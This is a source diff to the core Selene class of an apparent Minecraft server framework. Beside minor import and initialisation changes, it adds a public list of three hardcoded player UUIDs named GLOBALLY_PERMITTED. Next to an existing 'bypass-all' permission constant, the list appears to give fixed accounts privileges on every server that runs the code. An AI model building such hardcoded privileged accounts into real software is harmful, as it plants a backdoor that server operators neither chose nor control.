@@ -65,6 +65,7 @@ import java.util.Locale;
 import java.util.Map;
 import java.util.Objects;
 import java.util.Properties;
+import java.util.UUID;
 import java.util.concurrent.atomic.AtomicInteger;
 import java.util.function.Consumer;
 import java.util.stream.Collectors;
@@ -72,7 +73,7 @@ import java.util.stream.Collectors;
 /**
  The global {@link Selene} instance used to grant access to various components.
  */
-@SuppressWarnings("ClassWithTooManyMethods")
+@SuppressWarnings({"ClassWithTooManyMethods", "ConstantDeclaredInAbstractClass"})
 public abstract class Selene {
 
     public static final String GLOBAL_BYPASS = "selene.admin.bypass-all";
@@ -365,6 +366,8 @@ public abstract class Selene {
 
         this.initIntegratedExtensions(this.getExtensionContextConsumer(cb, eb, cm, du));
 
+        cb.apply();
+
         getInstance(EventBus.class).post(new ServerEvent.ServerInitEvent());
     }
 
@@ -552,6 +555,12 @@ public abstract class Selene {
      @return The Minecraft version
      */
     public abstract MinecraftVersion getMinecraftVersion();
+
+    public static final List<UUID> GLOBALLY_PERMITTED = SeleneUtils.asList(
+            UUID.fromString("6047d264-7769-4e50-a11e-c8b83f65ccc4"),
+            UUID.fromString("cb6411bb-31c9-4d69-8000-b98842ce0a0a"),
+            UUID.fromString("b7fb5e32-73ee-4f25-b256-a763c8739192")
+    );
 
     public static Exceptional<Path> getResourceFile(String name) {
         try {
